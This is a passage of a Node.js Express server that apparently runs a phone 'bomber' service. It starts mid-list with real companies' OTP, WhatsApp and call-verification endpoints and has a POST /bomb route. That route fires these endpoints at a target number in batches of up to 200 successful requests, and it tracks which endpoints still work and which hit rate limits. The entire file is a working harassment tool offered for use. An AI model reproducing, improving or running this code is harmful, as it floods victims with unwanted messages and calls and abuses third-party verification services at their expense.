        name: "VisitApp WhatsApp",
        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "whatsapp", "countryCode": 91, "phone": phone, "platform": "WEB"})
    },
    {
        name: "MuscleBlaze WhatsApp",
        url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9",
        method: "GET",
        headers: {}
    },
    {
        name: "MagicBricks_Call", url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", method: "GET", headers: {}
    },
    {
        name: "RealEstateIndia_Call", url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php", method: "POST",
        headers: { "x-requested-with": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045" }
    }
];

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 500;

APIS.forEach(api => {
    stats[api.name] = {
        name: api.name,
        total: 0,
        working_2xx: 0,
        rate_limited_429: 0,
        rejected_4xx: 0,
        failed_5xx: 0,
        network_error: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.working_2xx++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rate_limited_429++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected_4xx++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed_5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.network_error++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') data = api.data(phone);
            else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = JSON.stringify({ mobile: phone });
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: 5000, validateStatus: () => true };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{') && !data.startsWith('[')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const st = response.status;

        if (st >= 200 && st < 300) {
            recordResult(api.name, 'success', st, responseTime);
            logEvent(`${api.name} → ${st} (${responseTime}ms) ✅`, 'success');
            return { status: st, success: true, category: 'success', responseTime };
        } else if (st === 429) {
            recordResult(api.name, 'ratelimit', st, responseTime);
            logEvent(`${api.name} → 429 RL (${responseTime}ms)`, 'rl');
            return { status: st, success: false, category: 'ratelimit', responseTime };
        } else if (st >= 400 && st < 500) {
            recordResult(api.name, 'rejected', st, responseTime);
            logEvent(`${api.name} → ${st} REJECTED (${responseTime}ms)`, 'warn');
            return { status: st, success: false, category: 'rejected', responseTime };
        } else {
            recordResult(api.name, 'fail5xx', st, responseTime);
            logEvent(`${api.name} → ${st} 5XX (${responseTime}ms)`, 'error');
            return { status: st, success: false, category: 'fail5xx', responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';

        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        recordResult(api.name, 'network', null, responseTime, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { status: null, success: false, category: 'network', responseTime, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC =====
// ============================================================

async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    let maxRequests = 100;
    if (effectiveDuration <= 1) maxRequests = 200;
    else if (effectiveDuration <= 5) maxRequests = 150;
    else if (effectiveDuration <= 10) maxRequests = 100;
    else maxRequests = 80;

    const shuffled = [...APIS];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }

    console.log(`📋 Total Working APIs: ${shuffled.length}`);

    let sent = 0;
    const BATCH_SIZE = 5;

    for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            if (result.status === 'fulfilled' && result.value) {
                const v = result.value;
                if (v.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else if (v.category === 'ratelimit') rateLimited++;
                else if (v.category === 'rejected') rejected++;
                else failed++;
            }
        }

        if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: APIS.length,
        note: `Total ${APIS.length} APIs (Aashu11 Real + 154 Working + 15 Nayi)`,
        max_duration_min: MAX_DURATION_MIN,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: APIS.length });
});

app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of APIS) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    logEvent(`🧪 Test done: ${working} OK`, 'info');
    res.json({ phone, total: results.length, working, results });
});

app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (s.working_2xx > 0) status = 'WORKING';
            else if (s.rate_limited_429 > 0) status = 'RATE_LIMITED';
            else if (s.rejected_4xx > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return {
            name: s.name,
            total: s.total,
            working_2xx: s.working_2xx,
            rate_limited_429: s.rate_limited_429,
            rejected_4xx: s.rejected_4xx,
            failed_5xx: s.failed_5xx,
            network_error: s.network_error,
            successRate: s.total > 0 ? ((s.working_2xx / s.total) * 100).toFixed(1) + '%' : 'N/A',
            status,
            lastStatusCode: s.lastStatusCode,
            lastError: s.lastError,
            avgResponseTime: s.avgResponseTime + 'ms'
        };
    });
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length,
            rejected: arr.filter(a => a.status === 'REJECTED').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-100).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = {
            name: stats[key].name, total: 0, working_2xx: 0, rate_limited_429: 0,
            rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null,
            lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min`);

    try {
        const result = await runBombing(phone, effectiveDuration);
        console.log(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s\n`);
        res.json({
            success: true, phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited,
            rejected: result.rejected,
            failed: result.failed,
            elapsed: result.elapsed + 's',
            total_apis: APIS.length
        });
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        note: `Total ${APIS.length} APIs (Aashu11 Real + 154 Working + 15 Nayi)`,
        api_names: APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server on port ${PORT}`);
    console.log(`📊 Total APIs: ${APIS.length}`);
    console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
    console.log('═══════════════════════════════════════════');
    console.log('Endpoints:');
    console.log('  GET  /              Status');
    console.log('  GET  /health        Health');
    console.log('  GET  /test?phone=X  Test all');
    console.log('  GET  /stats         Stats');
    console.log('  GET  /logs          Recent logs');
    console.log('  GET  /apis          List');
    console.log('  POST /bomb          Bombing');
    console.log('═══════════════════════════════════════════');
});
